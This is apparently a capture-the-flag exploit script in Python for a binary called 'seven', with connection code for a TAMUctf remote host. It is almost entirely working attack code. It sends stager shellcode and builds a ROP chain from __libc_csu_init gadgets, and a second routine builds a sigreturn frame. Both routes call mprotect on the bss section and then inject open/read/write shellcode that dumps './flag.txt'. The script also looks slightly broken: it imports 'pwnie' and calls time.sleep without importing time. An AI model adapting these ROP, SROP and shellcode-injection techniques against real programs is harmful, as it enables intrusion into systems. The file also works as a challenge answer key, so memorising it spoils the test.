#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwnie import *
from time import sleep

# context.log_level = 'debug'
exe = context.binary = ELF('./seven_patched', checksec=False)
libc = exe.libc

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote("tamuctf.com", 443, ssl=True, sni="tamuctf_seven")
    elif args.DOCKER:
        p = remote("localhost", 1337)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/home/app/chall"]).recvall().strip().decode()
        gdb.attach(int(pid), gdbscript=gdbscript, exe=exe.path)
        pause()
        return p
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''

b *0x401126

c
'''.format(**locals())

p = start()
# ==================== EXPLOIT ====================

def csu():

    shellcode = asm('''

        push rsp
        pop rsi

        xor edi, edi
        syscall

        ret

    ''')

    s(shellcode)

    '''
       0x0000000000401348 <+56>:    mov    rdx,r15
       0x000000000040134b <+59>:    mov    rsi,r14
       0x000000000040134e <+62>:    mov    edi,r13d
       0x0000000000401351 <+65>:    call   QWORD PTR [r12+rbx*8]

       0x0000000000401362 <+82>:    pop    rbx
       0x0000000000401363 <+83>:    pop    rbp
       0x0000000000401364 <+84>:    pop    r12
       0x0000000000401366 <+86>:    pop    r13
       0x0000000000401368 <+88>:    pop    r14
       0x000000000040136a <+90>:    pop    r15
       0x000000000040136c <+92>:    ret
    '''

    # r15 -> rdx
    # r14 -> rsi
    # r13 -> edi

    pop_6_regs = exe.sym.__libc_csu_init+82
    call_r12_rbx = exe.sym.__libc_csu_init+56

    rop = flat(
        pop_6_regs,
        0,                          # rbx 
        1,                          # rbp
        exe.got.mprotect,           # r12
        0x404000,                   # r13    
        0x1000,                     # r14
        7,                          # r15
        call_r12_rbx,
        0,

        0,
        1,
        exe.got.read,
        0,
        0x404000,
        0x100,
        call_r12_rbx,
        0,

        0,
        1,
        exe.got.read,
        0,
        0x404000+0x50,
        0x100,
        call_r12_rbx,
        0,

        0, 
        0,
        0x404000,
        0,
        0,
        0,
        call_r12_rbx,
    )

    sleep(0.5)
    s(rop)

    sleep(0.5)
    s(p64(0x404000+0x50)) # read to 0x404000
    shellcode = asm(shellcraft.open('./flag.txt')) 
    shellcode += asm(shellcraft.read(6, 'rsp', 100)) 
    shellcode += asm(shellcraft.write(1, 'rsp', 100))

    sleep(0.5)
    s(shellcode)

def srop():

    shellcode = asm('''

        push rsp
        pop rsi

        xor edi, edi
        syscall

        ret

    ''')
    s(shellcode)

    syscall_ret = 0x500004
    pop_rdi = 0x40136b
    pop_rsi_r15 = 0x401369
    bss = 0x404000

    # call mprotect(bss, 0x1000, 7)
    frame = SigreturnFrame()
    frame.rdi = bss
    frame.rsi = 0x1000
    frame.rdx = 7 
    frame.rax = 0xa
    frame.rip = syscall_ret
    frame.rsp = 0x400598

    payload = flat(

        pop_rdi, 0,
        pop_rsi_r15, bss + 0x10, 0,
        exe.plt.read,
        syscall_ret,
        bytes(frame)
    )

    s(payload)

    shellcode = asm(f'''
        xor eax, eax
        xor edi, edi
        mov esi, {bss+0x10}
        add rdx, 127
        syscall
    ''')

    sleep(0.5)
    # input()
    s(shellcode.ljust(0xf, b'\x00'))

    shellcode = asm(f'mov rsp, {bss+0x190}')
    shellcode += asm(shellcraft.open('./flag.txt')) 
    shellcode += asm(shellcraft.read('rax', 'rsp', 100)) 
    shellcode += asm(shellcraft.write(1, 'rsp', 'rax'))

    sleep(0.5)
    # input()
    s(b'\x90' * 0xf + shellcode)

def exploit():

    # csu()
    srop()

    interactive()

if __name__ == '__main__':
    exploit()
